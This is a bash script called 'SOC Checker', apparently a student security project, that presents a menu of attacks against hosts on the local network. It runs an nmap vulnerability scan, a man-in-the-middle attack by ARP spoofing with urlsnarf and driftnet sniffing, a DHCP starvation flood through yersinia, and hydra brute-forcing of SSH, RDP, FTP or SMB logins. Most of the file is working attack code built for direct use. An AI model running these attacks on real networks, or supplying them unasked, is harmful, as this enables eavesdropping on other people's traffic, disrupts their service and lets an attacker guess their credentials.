#!/bin/bash

#### Guy Evenchen SOC Project script v1 - SOC CHECKER ####

# Copyright © Guy_Evenchen 2023

#All rights reserved. This script is the intellectual property of Guy Evenchen. You may use, modify, and distribute this script for educational and non-commercial purposes only. Any unauthorized use, reproduction, or distribution is strictly prohibited. [Your Name] assumes no responsibility for any damages or liabilities arising from the use of this script.

# For inquiries, please contact https://www.linkedin.com/in/guy-evenchen/ .


######################################################################################################################################

#### This function is scanning for vulnerability / CVE's inside the local netowrk.
#### The function using arp the network and using nmap with --script=vuln to check if there is any vulnerability found.
#### The info is saved into log inside /var/log 


function Vuln(){
    echo -e "\e[31m$(figlet vulnerability)\e[0m"
    Log_File_NMAP="/var/log/Nmap_scanned.log" # Path to log #

    Local_IP=$(ip -4 addr show eth0 | grep -oP 'inet \K[\d.]+' | head -1)
    Default_Gateway=$(ip route | grep default | awk '{print $3}')
    echo "[*] Running vulnerability Scan in the network [*]"
    sleep 1
    Local_IP=$(ip -4 addr show eth0 | grep -oP 'inet \K[\d.]+' | head -1)
    echo "[*]Your Local IP: $Local_IP [*]"
    Default_Gateway=$(ip route | grep default | awk '{print $3}')
    echo "[*]Your Default Gateway / Router IP: $Default_Gateway [*]"
    sleep 2
    echo "[!] The Network connected IP'S / Devices to the network [!]"

    Local_Network=$(sudo arp-scan --localnet 2>/dev/null | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1, $2}')
    echo "$Local_Network" | tail -n +2 | awk '{print "IP: " $1, "MAC: " $2}'

    echo "$Local_Network" | tail -n +2| while read -r IP MAC; do
    echo
    echo "[!] Checking vulnerabilities for: $IP [!]"
    
    Nmap_Result=$(sudo nmap --script=vuln "$IP")
    CVE_List=$(echo "$Nmap_Result" | grep -oP 'CVE-\d+-\d+')
    
        if [ -n "$CVE_List" ]; then
            echo "CVEs found: $CVE_List"
        else
            echo "No CVEs found."
         fi
    
    echo "$Nmap_Result" >> "$Log_File_NMAP"
    date >> "$Log_File_NMAP"
    done
    MAIN_MENU


}


######################################################################################################################################


####This Function is using the MITM attack (man in the middle), the hacker positions themselves between the router and the targeted device, allowing them to eavesdrop on the communication 
#### If the user using http port the user can see his screen.
#### The info is saved into log inside /var/log 

function MITM() {
    Log_File_MITM="/var/log/mitm_sniffed_list.txt" # Path to log #

    echo -e "\e[31m$(figlet MITM)\e[0m"

    ## Installation #1
    sudo apt install dsniff > /dev/null 2>&1
    ## Installation #2
    sudo apt install driftnet > /dev/null 2>&1

    Local_IP=$(ip -4 addr show eth0 | grep -oP 'inet \K[\d.]+' | head -1)
    Default_Gateway=$(ip route | grep default | awk '{print $3}')
    echo "[!] The Network IP'S and Devices that connected to the network:"
    Local_Network=$(sudo arp-scan --localnet 2>/dev/null | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1, $2}')
    echo "$Local_Network" | awk '{print "IP: " $1, "MAC: " $2}'
    echo
    read -p "Please choose the attacked IP address to start the MITM :" Attacked_IP
    sleep 2
    echo "[!] The Local IP: $Local_IP"
    sleep 1
    echo "[!] The Router IP: $Default_Gateway"
    sleep 1
    echo "[!] The Attacked IP: $Attacked_IP"
    sleep 2

    echo "[!] Start Sniffing the Network 🕵️👃💨 "
    sleep 1

    sudo arpspoof -t $Attacked_IP $Local_IP > /dev/null 2>&1 &
    sudo arpspoof -t $Default_Gateway $Local_IP > /dev/null 2>&1 &
    sudo urlsnarf -i eth0
    sudo driftnet -i eth0 | tee -a $Log_File_MITM-$(date '+%Y-%m-%d_%H:%M:%S').log
    read -p "[!]Press Enter to stop the MITM attack[!]"

    ## Stop arp and url tools ##
    sudo pkill arpspoof
    sudo pkill urlsnarf
    sudo pkill driftnet

    echo "Attack log saved to: $Log_File_MITM"
    sleep 1
    echo "Going back to Main Menu .. "
    sleep 2

    MAIN_MENU
}

######################################################################################################################################

#### This function preforimg DDOS Attack via the Tool yersinia, the tool sending DHCP Discvoer packets "flood" the DHCP Server to not give ip address for the devices.
#### The user need to use the information below to use this tool and send the packets.
#### The info is saved into log inside /var/log 



function DDOS() {
    echo -e "\e[31m$(figlet DDOS)\e[0m"

    echo -e "[!] To use the tool after it opens:
    1. Press -> \"X\"
    2. Then -> \"F2\"
    3. Press \"X\" again
    4. Lastly, select -> \"1\" for DHCP Discover Packets
    To exit, press \"Q\"."
    
    sleep 10
    ## Installation #1
    sudo apt install hping3 > /dev/null 2>&1
     ## Installation #2
    sudo apt-get install yersinia > /dev/null 2>&1

   #### Newer version will use this tool.,please ignore the  green (#) commands ###

   # read -p "Enter the number of Packets to send: " number_of_packets
   # read -p "Enter Port Number: "
   # hping3 --file source_ip_list.txt --rand-source -p $your_port_number -c $number_of_packets
   # Extract IP addresses from Local_Network and save them to a file


    Local_Network=$(sudo arp-scan --localnet 2>/dev/null | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1, $2}') > /dev/null 2>&1
    echo "$Local_Network" | awk '{print $1}' | date | echo "DDOS" >> /var/log/ddos_source_ip_list.log

    sleep 2

    echo "Trying to do DHCP / DDOS Attack to a random IP in your network .."

    sudo yersinia -I  

    echo "Going back to Main Menu .. "
    sleep 2


    MAIN_MENU
}

######################################################################################################################################

#### This function is using brute force via hydra (online attack tool),the user can scan and check whice ip address he wants to attack.
#### User need to locate his own password list to load and set the prefered ip and service option such as ssh or smb and the correct username.
#### The info is saved into log inside /var/log 


function BRUTE_FORCE() {
    Log_File_BF="/var/log/hydra_attack.log" # Path to log #

    echo -e "\e[31m$(figlet Brute Force)\e[0m"
    Local_Network=$(sudo arp-scan --localnet 2>/dev/null | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1, $2}') > /dev/null 2>&1

    Local_IP=$(ip -4 addr show eth0 | grep -oP 'inet \K[\d.]+' | head -1)
    echo "Your Local IP Address is: $Local_IP"
    sleep 1
    echo -e "[!] Local Network IP addresses and MAC addresses:\n$Local_Network"
    sleep 1
    echo
    read -p "[*] Please Enter the IP Address of your local network you want to attack :" Attacked_IP
    sleep 1
    read -p "Please Enter the Password List Path: " Password_Path_list
    sleep 1
    read -p "Please choose your preferred service [ssh / rdp / ftp / smb]: " Service
    sleep 1
    read -p "Please Enter the Attacked Username :" Username
    sleep 1
    sudo hydra -l $Username -P $Password_Path_list -t 3 $Service://$Attacked_IP | tee -a $Log_File_BF-$(date '+%Y-%m-%d_%H:%M:%S').log
    sleep 1
    echo "Attack log saved to: $Log_File_BF"
    sleep 1
    echo "Going back to Main Menu .. "
    sleep 2

    MAIN_MENU
}

######################################################################################################################################



#### This Function is the main menu,diplaying all the options to the user,there is 3 attacks and 1 scanner and 1 documentation.
#### The User can select his prefered option to use my tool. 


function MAIN_MENU() {
    if [ "$(id -u)" -ne 0 ]; then
    echo "Please run the script as root - using sudo su/sudo"
    exit 1
    fi


    echo -e "\e[31m$(figlet SOC CHECKER)\e[0m"
    sleep 1
    echo "Copyrights: Guy Evenchen ®️- Project Script v1.2"
    sleep 1

    ## Installation #1
    sudo apt-get install arp-scan > /dev/null 2>&1
    ## Installation #2
    sudo apt install dsniff > /dev/null 2>&1

    ## Show Current Local IP Address ##
    Local_IP_Main=$(ip -4 addr show eth0 | grep -oP 'inet \K[\d.]+' | head -1)
    sleep 1
    echo 
    echo "-- Your IP Address in this Local Network is: $Local_IP_Main --"

    ## The Main Menu for the attacks script ##
    echo -e "\e[31m$(figlet Menu)\e[0m"
    while true; do
        echo "[?] Choose an attack option:"
        echo -e "\e[33m[1] ⇉ Brute Force Attack💪🏻\e[0m"
        echo -e "\e[33m[2] ⇉ DHCP Starvation Attack (DDOS)🍽️\e[0m"
        echo -e "\e[33m[3] ⇉ MITM Attack👤👤👤\e[0m"
        echo -e "\e[33m[4] ⇉ vulnerability/cve Scanner🕵🏻\e[0m"
        echo -e "\e[33m[5] ⇉ Attack Descriptions📄\e[0m"
        echo -e "\e[33m[6] ⇉ Copyright ©\e[0m"
        echo -e "\e[33m[7] ⇉ Exit Script 👋\e[0m"

        read -p "[*] Please select option (1/2/3/4/5/6/7): " choice

  case $choice in
            1)
                echo "[!] You selected Option [1] Performing ⇉➤ Brute Force Attack [!]"
                sleep 2
                BRUTE_FORCE
                ;;
            2)
                echo "[!] You selected Option [2] Performing ⇉➤ DDOS Attack [!]"
                sleep 2
                DDOS
                ;;
            3)
                echo "[!] You selected Option [3] Performing ⇉➤ MITM Attack [!]"
                sleep 2
                MITM
                ;;
            4)
                echo "[!] You selected Option [4] Performing ⇉➤ vulnerability Scanner [!]"
                sleep 2
                Vuln
                ;;
            5)
                echo "[!] You selected Option [5] Descriptions 📄 (closing in 1 Minute) [!]"
                echo
                echo -e "[?] Brute Force | A Brute Force Attack is like a digital burglar 🥷🏾 trying every key in the neighborhood until they find the one that unlocks 🔓 the door.🚪 \n In this method, attackers systematically attempt all possible combinations of usernames and passwords until they discover 🔎 the correct credentials.🪪 \n It's a straightforward but time-consuming approach that relies on sheer computing power to break through security 👮🏻‍♂️ measures and gain unauthorized access."

                echo
                echo -e "[?] DHCP Starvation Attack | Imagine 🤔 a traffic jam 🚦🚗 🚙🚌__ on the information highway. A Distributed Denial of Service (DDoS) attack 🤺 is like maliciously clogging up a network, service, or website 🌐 with an overwhelming flood of internet traffic. \n The aim 🎯 is to render the target inaccessible, causing downtime and potential financial losses 💲"

                echo
                echo -e "[?] MITM | Picture an invisible eavesdropper 🦻🏼 at a private conversation 🗣 \n A Man-in-the-Middle 🙋🏻‍♂️ (MITM) Attack is a cyber attack where an unauthorized third party intercepts and potentially alters communication between two parties without their knowledge.🧠 \n The attacker secretly relays and may manipulate the information exchanged between the victims, gaining access to sensitive data. 📂"
              
                sleep 60
                MAIN_MENU
                ;;

            6)
                echo "[!] You selected Option [6] Copyright © [!]"
                sleep 1
                echo 
                echo "  Copyright © Guy Evenchen "

                echo -e "All rights reserved.This script is the intellectual property of Guy E.\n You may use, modify, and distribute this script for educational and non-commercial purposes only. \n Any unauthorized use, reproduction, or distribution is strictly prohibited. Guy  assumes no responsibility for any damages or liabilities arising from the use of this script."

                echo "For inquiries, please contact https://www.linkedin.com/in/guy-evenchen/ , https://github.com/Evenchen21 ."

                sleep 10

                MAIN_MENU

                ;;   

            7)
                echo "[!] You selected Option [7] Exiting the Script.. 😭 [!]"
                sleep 1
                echo "$(figlet BYE !)"
                exit
                ;;  


            *)
                echo "🚫 Invalid Choice.. Exiting Script❕🚫 "
                sleep 2
                exit 
                ;;
        esac
    done
}

MAIN_MENU
